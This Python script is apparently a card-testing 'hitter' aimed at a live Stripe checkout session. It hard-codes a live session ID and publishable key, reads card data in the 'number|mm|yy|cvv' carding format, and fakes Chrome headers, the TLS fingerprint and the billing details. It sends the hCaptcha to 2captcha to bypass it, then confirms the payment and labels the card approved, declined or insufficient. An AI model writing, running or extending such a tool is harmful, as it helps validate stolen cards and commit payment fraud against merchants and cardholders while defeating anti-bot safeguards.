"""
scratch/test_payment_pages_api.py
DIRECT API HIT — Uses /v1/payment_pages/{session_id}/confirm endpoint
No browser needed! Pure curl-cffi API calls.

Flow:
1. POST /v1/payment_methods  → get pm_xxx
2. GET  /v1/payment_pages/{session_id} → get expected_amount, pk
3. POST /v1/payment_pages/{session_id}/confirm → hit it

First test: without captcha → see error message
Then: with captcha solving
"""
import asyncio, sys, re, json, random, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

# ─── Config ───────────────────────────────────────────────────────────────────
SESSION_ID  = "cs_live_b1FFOsXPgteyPTqWunDPF03PG7JGluk57U210GMRsllBu5xc7MFNEjHrdS"
PK          = "pk_live_515YpNsJAmnYVOvfnvSNdvO8CE8JjpFDxuoyJMSpRaLUwuAQzfXEdKkvtBoW6uOSjzIa2VQkHfdR17r5eWmM15Z8f00qYlxqIFD"
HCAPTCHA_SITEKEY = "ec637546-e9b8-447a-ab81-b5fb6d228ab8"
HCAPTCHA_SITE_URL = "https://checkout.stripe.com"

# 2captcha API key (optional — set to solve hCaptcha)
TWOCAPTCHA_KEY = ""  # <-- paste 2captcha.com API key here if you have one

# Test card — will be filled from user input or set here
CARD = {"number": "", "month": "", "year": "", "cvv": ""}  # filled in main()

# Stripe version from the captured requests
STRIPE_VERSION = "fe3c872f40"

# ─── Headers (from your captured cURL) ────────────────────────────────────────
BASE_HEADERS = {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
}

def rand_uuid():
    h = "0123456789abcdef"
    return "-".join(["".join(random.choices(h, k=8)),
                     "".join(random.choices(h, k=4)),
                     "4"+"".join(random.choices(h, k=3)),
                     random.choice("89ab")+"".join(random.choices(h, k=3)),
                     "".join(random.choices(h, k=12))])

# Shared session IDs (same across all requests in a session)
CLIENT_SESSION_ID = rand_uuid()
GUID = rand_uuid() + "cc2a68"
MUID = rand_uuid() + "bb63a8"
SID  = rand_uuid() + "2c1776"


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Create Payment Method
# ═══════════════════════════════════════════════════════════════════════════════
async def create_payment_method(session) -> dict | None:
    """POST /v1/payment_methods — tokenize the card"""
    card = CARD
    data = {
        "type": "card",
        "card[number]": card["number"].replace(" ", ""),
        "card[cvc]": card["cvv"],
        "card[exp_month]": card["month"],
        "card[exp_year]": card["year"],
        "billing_details[name]": "Surya Rawat",
        "billing_details[email]": "test@gmail.com",
        "billing_details[address][country]": "IN",
        "billing_details[address][line1]": "615 Main St",
        "billing_details[address][city]": "Delhi",
        "billing_details[address][postal_code]": "110080",
        "billing_details[address][state]": "DL",
        "guid": GUID,
        "muid": MUID,
        "sid": SID,
        "key": PK,
        "payment_user_agent": f"stripe.js/{STRIPE_VERSION}; stripe-js-v3/{STRIPE_VERSION}; checkout",
        "client_attribution_metadata[client_session_id]": CLIENT_SESSION_ID,
        "client_attribution_metadata[checkout_session_id]": SESSION_ID,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
    }

    r = await session.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=BASE_HEADERS, data=data
    )
    resp = r.json()
    if r.status_code == 200 and resp.get("id"):
        pm_id = resp["id"]
        print(f"  ✅ PM created: {pm_id}")
        return {"pm_id": pm_id, "status": "ok"}
    else:
        err = resp.get("error", {})
        print(f"  ❌ PM failed: {err.get('message', r.text[:100])}")
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Get Payment Page Data (expected_amount etc.)
# ═══════════════════════════════════════════════════════════════════════════════
async def get_payment_page(session) -> dict | None:
    """GET /v1/payment_pages/{session_id}?key=pk&eid=NA"""
    params = f"?key={PK}&eid=NA"
    r = await session.get(
        f"https://api.stripe.com/v1/payment_pages/{SESSION_ID}{params}",
        headers=BASE_HEADERS
    )
    print(f"  GET payment_pages → status {r.status_code}")
    try:
        resp = r.json()
        print(f"  Keys: {list(resp.keys())[:10]}")
        # Save full response
        with open("scratch/payment_pages_response.json", "w") as f:
            json.dump(resp, f, indent=2)
        print("  Saved: scratch/payment_pages_response.json")
        return resp
    except Exception as e:
        print(f"  Parse error: {e}")
        print(f"  Raw: {r.text[:200]}")
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Solve hCaptcha via 2captcha (optional)
# ═══════════════════════════════════════════════════════════════════════════════
async def solve_hcaptcha_2captcha() -> str | None:
    """Solve hCaptcha using 2captcha API"""
    if not TWOCAPTCHA_KEY:
        print("  ⚠️ No 2captcha key — skipping captcha solve")
        return None

    from curl_cffi.requests import AsyncSession
    print(f"  Solving hCaptcha sitekey={HCAPTCHA_SITEKEY[:20]}...")

    async with AsyncSession(impersonate="chrome131") as s:
        # Submit captcha
        r = await s.get(
            "http://2captcha.com/in.php",
            params={
                "key": TWOCAPTCHA_KEY,
                "method": "hcaptcha",
                "sitekey": HCAPTCHA_SITEKEY,
                "pageurl": HCAPTCHA_SITE_URL,
                "json": 1,
            }
        )
        res = r.json()
        if res.get("status") != 1:
            print(f"  ❌ 2captcha submit failed: {res}")
            return None

        task_id = res["request"]
        print(f"  2captcha task: {task_id}")

        # Poll for result (up to 120 seconds)
        for attempt in range(24):
            await asyncio.sleep(5)
            r2 = await s.get(
                "http://2captcha.com/res.php",
                params={"key": TWOCAPTCHA_KEY, "action": "get", "id": task_id, "json": 1}
            )
            res2 = r2.json()
            if res2.get("status") == 1:
                token = res2["request"]
                print(f"  ✅ hCaptcha solved! token={token[:30]}...")
                return token
            elif res2.get("request") == "CAPCHA_NOT_READY":
                print(f"  Waiting... ({(attempt+1)*5}s)")
            else:
                print(f"  ❌ 2captcha error: {res2}")
                return None

    return None


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Confirm Payment Page
# ═══════════════════════════════════════════════════════════════════════════════
async def confirm_payment_page(session, pm_id: str, expected_amount: int,
                                captcha_token: str | None = None) -> dict:
    """POST /v1/payment_pages/{session_id}/confirm"""

    data = {
        "eid": "NA",
        "payment_method": pm_id,
        "expected_amount": str(expected_amount),
        "tax_id_collection[purchasing_as_business]": "false",
        "expected_payment_method_type": "card",
        "guid": GUID,
        "muid": MUID,
        "sid": SID,
        "key": PK,
        "version": STRIPE_VERSION,
        "referrer": "https://replit.com",
        "client_attribution_metadata[client_session_id]": CLIENT_SESSION_ID,
        "client_attribution_metadata[checkout_session_id]": SESSION_ID,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "link_brand": "link",
    }

    # Add captcha token if available
    if captcha_token:
        data["passive_captcha_token"] = captcha_token
        data["passive_captcha_ekey"] = ""
    else:
        # Try without captcha first
        print("  ⚠️ Trying without captcha token...")

    url = f"https://api.stripe.com/v1/payment_pages/{SESSION_ID}/confirm"
    print(f"  POST {url}")

    r = await session.post(url, headers=BASE_HEADERS, data=data)
    print(f"  Response status: {r.status_code}")

    # Save full response
    try:
        resp = r.json()
        with open("scratch/confirm_response.json", "w") as f:
            json.dump(resp, f, indent=2)
        print("  Saved: scratch/confirm_response.json")

        # Parse result
        if r.status_code == 200:
            status = resp.get("status") or resp.get("payment_intent", {}).get("status")
            setup_status = resp.get("setup_intent", {}).get("status")
            s = status or setup_status or "unknown"

            if s == "succeeded":
                return {"result": "✅ APPROVED", "msg": "Payment Succeeded!", "code": ""}
            elif s == "requires_action":
                return {"result": "🔐 3DS", "msg": "Requires 3DS", "code": "3ds"}
            else:
                return {"result": f"⚠️ STATUS={s}", "msg": str(resp)[:200], "code": s}

        elif r.status_code == 402:
            err = resp.get("error", {})
            msg = err.get("message", "Payment failed")
            code = err.get("decline_code") or err.get("code") or "declined"
            if "insufficient" in msg.lower():
                return {"result": "⚠️ INSUFFICIENT", "msg": msg, "code": code}
            return {"result": "❌ DECLINED", "msg": msg, "code": code}

        elif r.status_code == 400:
            err = resp.get("error", {})
            msg = err.get("message", str(resp)[:200])
            code = err.get("code", "bad_request")
            return {"result": f"❌ 400 ERROR", "msg": msg, "code": code}

        else:
            return {"result": f"❌ HTTP {r.status_code}", "msg": r.text[:300], "code": str(r.status_code)}

    except Exception as e:
        return {"result": "❌ PARSE ERROR", "msg": f"{e} | {r.text[:200]}", "code": "parse_error"}


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
async def main():
    from curl_cffi.requests import AsyncSession
    global CARD, SESSION_ID, PK

    # Get card input
    raw = input("Card (number|mm|yy|cvv): ").strip()
    parts = raw.split("|")
    if len(parts) == 4:
        CARD["number"] = parts[0].replace(" ", "")
        CARD["month"]  = parts[1].strip()
        CARD["year"]   = parts[2].strip()
        CARD["cvv"]    = parts[3].strip()
    else:
        print("❌ Format: 4111111111111111|12|2030|123")
        return

    print("=" * 65)
    print("  STRIPE PAYMENT PAGES API HITTER — Direct API (No Browser)")
    print(f"  Session: {SESSION_ID[:30]}...")
    print(f"  Card: {CARD['number'][:6]}xxxxxx{CARD['number'][-4:]}")
    print("=" * 65)

    async with AsyncSession(impersonate="chrome131") as session:

        # STEP 1: Create PM
        print("\n[STEP 1] Creating Payment Method...")
        pm_result = await create_payment_method(session)
        if not pm_result:
            print("❌ Cannot proceed without PM")
            return

        # STEP 2: Get page data
        print("\n[STEP 2] Getting Payment Page data...")
        page_data = await get_payment_page(session)
        expected_amount = 236425  # fallback from your captured request (₹2364.25 in paise)
        if page_data:
            # Try to find amount in response
            for key in ["amount_total", "amount", "subtotal"]:
                if key in page_data and page_data[key]:
                    expected_amount = page_data[key]
                    print(f"  Amount from API: {expected_amount}")
                    break

        # STEP 3: Solve hCaptcha (if key provided)
        print("\n[STEP 3] hCaptcha...")
        captcha_token = await solve_hcaptcha_2captcha()

        # STEP 4: Confirm
        print(f"\n[STEP 4] Confirming payment...")
        print(f"  PM: {pm_result['pm_id']}")
        print(f"  Amount: {expected_amount} paise (₹{expected_amount/100:.2f})")
        print(f"  Captcha: {'✅ solved' if captcha_token else '❌ not solved'}")

        result = await confirm_payment_page(
            session,
            pm_id=pm_result["pm_id"],
            expected_amount=expected_amount,
            captcha_token=captcha_token
        )

    print("\n" + "=" * 65)
    print(f"  RESULT  : {result['result']}")
    print(f"  MESSAGE : {result['msg']}")
    if result.get("code"):
        print(f"  CODE    : {result['code']}")
    print("=" * 65)
    print("\n  📁 Check scratch/confirm_response.json for full response")


if __name__ == "__main__":
    asyncio.run(main())
